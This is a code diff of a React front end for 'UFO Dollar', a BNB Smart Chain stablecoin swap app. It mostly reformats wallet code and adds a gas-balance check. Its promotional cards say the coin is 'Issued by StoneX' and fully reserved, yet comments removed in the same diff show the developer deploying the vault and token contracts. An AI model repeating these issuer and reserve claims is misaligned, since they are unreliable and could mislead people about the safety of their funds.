@@ -12,22 +12,15 @@ try {
     networks: [bsc],
     metadata: { name: 'UFO Dollar', description: 'Stablecoin Swap', url: window.location.origin, icons: [] },
     projectId: 'd6431212399f6c487b364387859983ea',
-    features: { 
-      analytics: true, 
-      allWallets: { showWallets: true } 
-    },
+    features: { analytics: true, allWallets: { showWallets: true } },
     featuredWalletIds: ['a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393']
   });
 } catch (e) { console.error(e); }
 
-
 // ================= 2. Config & ABI =================
-// ⚠️ 填入你刚刚部署成功的合约地址
-const VAULT_ADDRESS = '0x16fBa21bB5c35A8D67118b38259329AA814ED0DE'; // 这是你的金库地址
-const UFO_ADDRESS = '0x9CB5e78F88EFfb5315A7B445aFa64790C8e53eaB';   // 这是你的代币地址
-const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; // BSC USDT (不用动)
-
- 
+const VAULT_ADDRESS = '0x16fBa21bB5c35A8D67118b38259329AA814ED0DE'; 
+const UFO_ADDRESS = '0x9CB5e78F88EFfb5315A7B445aFa64790C8e53eaB';   
+const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; 
 const rpcProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
 
 const ERC20_ABI = [
@@ -90,23 +83,14 @@ function App() {
   const ensureBscNetwork = async () => {
     if (!walletProvider) return false;
     try {
-      await walletProvider.request({
-        method: 'wallet_switchEthereumChain',
-        params: [{ chainId: '0x38' }],
-      });
+      await walletProvider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
       return true;
     } catch (switchError) {
       if (switchError.code === 4902) {
         try {
           await walletProvider.request({
             method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: '0x38',
-              chainName: 'BNB Smart Chain',
-              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-              rpcUrls: ['https://bsc-dataseed.binance.org/'],
-              blockExplorerUrls: ['https://bscscan.com/']
-            }],
+            params: [{ chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org/'], blockExplorerUrls: ['https://bscscan.com/'] }],
           });
           return true;
         } catch (addError) {
@@ -195,6 +179,17 @@ function App() {
 
     try {
       const provider = new ethers.BrowserProvider(walletProvider);
+      
+      // 🔥 核心新增：检查用户钱包里有没有足够的 BNB 支付 Gas 费
+      const bnbBalance = await provider.getBalance(address);
+      const bnbBalanceFormatted = parseFloat(ethers.formatEther(bnbBalance));
+      
+      // 在 BSC 上，即使网络拥堵，0.0005 BNB 也足够完成一次授权+兑换。
+      if (bnbBalanceFormatted < 0.0005) {
+        setIsProcessing(false);
+        return alert(`⚠️ Gas Fee Insufficient!\n\nYour BNB balance is ${bnbBalanceFormatted.toFixed(4)} BNB.\nYou need at least 0.0005 BNB to pay for the network gas fee on BNB Smart Chain.\n\nPlease deposit a small amount of BNB to your wallet and try again.`);
+      }
+
       const signer = await provider.getSigner();
       const vault = new ethers.Contract(VAULT_ADDRESS, VAULT_ABI, signer);
 
@@ -393,7 +388,6 @@ function App() {
         {activeTab === 'rules' && (
           <div style={{ display: 'flex', flexDirection: 'column', gap: '16px', marginTop: '10px' }}>
             
-            {/* 1. Hero */}
             <div style={{ background: 'linear-gradient(135deg, #1e3a8a, #3b82f6)', padding: '28px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 10px 30px -10px rgba(30,58,138,0.3)', color: '#fff' }}>
               <div style={{ fontSize: '13px', fontWeight: '700', letterSpacing: '2px', color: 'rgba(255,255,255,0.8)', textTransform: 'uppercase', marginBottom: '10px' }}>
                 The Trusted Digital Dollar Stablecoin
@@ -406,7 +400,6 @@ function App() {
               </p>
             </div>
 
-            {/* 2. Security */}
             <div style={{ background: 'linear-gradient(135deg, #0f766e, #14b8a6)', padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 10px 30px -10px rgba(15,118,110,0.3)', color: '#fff' }}>
               <div style={{ fontSize: '12px', fontWeight: '700', letterSpacing: '2px', color: 'rgba(255,255,255,0.7)', textTransform: 'uppercase', marginBottom: '8px' }}>Security</div>
               <h4 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '10px' }}>Cryptographically tamper-proof.</h4>
@@ -415,7 +408,6 @@ function App() {
               </p>
             </div>
 
-            {/* 3. Global Reach & Confidentiality */}
             <div style={{ background: 'linear-gradient(135deg, #4c1d95, #8b5cf6)', padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 10px 30px -10px rgba(76,29,149,0.3)', color: '#fff' }}>
               <div style={{ fontSize: '12px', fontWeight: '700', letterSpacing: '2px', color: 'rgba(255,255,255,0.7)', textTransform: 'uppercase', marginBottom: '8px' }}>Global Reach & Confidentiality</div>
               <h4 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '10px' }}>Circulating across 160+ countries. Commercial details shielded.</h4>
@@ -424,7 +416,6 @@ function App() {
               </p>
             </div>
 
-            {/* 4. Privacy & Compliance */}
             <div style={{ background: 'linear-gradient(135deg, #4338ca, #6366f1)', padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 10px 30px -10px rgba(67,56,202,0.3)', color: '#fff' }}>
               <div style={{ fontSize: '12px', fontWeight: '700', letterSpacing: '2px', color: 'rgba(255,255,255,0.7)', textTransform: 'uppercase', marginBottom: '8px' }}>Privacy & Compliance</div>
               <h4 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '10px' }}>Confidential by default. Auditable by design.</h4>
@@ -433,7 +424,6 @@ function App() {
               </p>
             </div>
 
-            {/* 5. Issuance & Reserves */}
             <div style={{ background: 'linear-gradient(135deg, #1e293b, #475569)', padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 10px 30px -10px rgba(30,41,59,0.3)', color: '#fff' }}>
               <div style={{ fontSize: '12px', fontWeight: '700', letterSpacing: '2px', color: 'rgba(255,255,255,0.7)', textTransform: 'uppercase', marginBottom: '8px' }}>Issuance & Reserves</div>
               <h4 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '10px' }}>Issued by StoneX. Fully reserved 1:1. No arbitrary minting.</h4>
@@ -442,7 +432,6 @@ function App() {
               </p>
             </div>
 
-            {/* 6. Settlement Speed */}
             <div style={{ background: 'linear-gradient(135deg, #b45309, #f59e0b)', padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 10px 30px -10px rgba(180,83,9,0.3)', color: '#fff' }}>
               <div style={{ fontSize: '12px', fontWeight: '700', letterSpacing: '2px', color: 'rgba(255,255,255,0.7)', textTransform: 'uppercase', marginBottom: '8px' }}>Settlement Speed</div>
               <h4 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '10px' }}>Send money the way you send a message.</h4>
@@ -451,7 +440,6 @@ function App() {
               </p>
             </div>
 
-            {/* 7. Architecture */}
             <div style={{ background: 'linear-gradient(135deg, #064e3b, #10b981)', padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 10px 30px -10px rgba(6,78,59,0.3)', color: '#fff' }}>
               <div style={{ fontSize: '12px', fontWeight: '700', letterSpacing: '2px', color: 'rgba(255,255,255,0.7)', textTransform: 'uppercase', marginBottom: '8px' }}>Architecture</div>
               <h4 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '10px' }}>Closed-loop by design. Isolated from market speculation.</h4>
@@ -460,7 +448,6 @@ function App() {
               </p>
             </div>
 
-            {/* 8. Disclaimer */}
             <div style={{ background: 'linear-gradient(135deg, #7f1d1d, #ef4444)', padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 10px 30px -10px rgba(127,29,29,0.3)', color: '#fff' }}>
               <div style={{ fontSize: '12px', fontWeight: '700', letterSpacing: '2px', color: 'rgba(255,255,255,0.7)', textTransform: 'uppercase', marginBottom: '8px' }}>Disclaimer</div>
               <h4 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '10px' }}>A payment instrument, not an investment product.</h4>
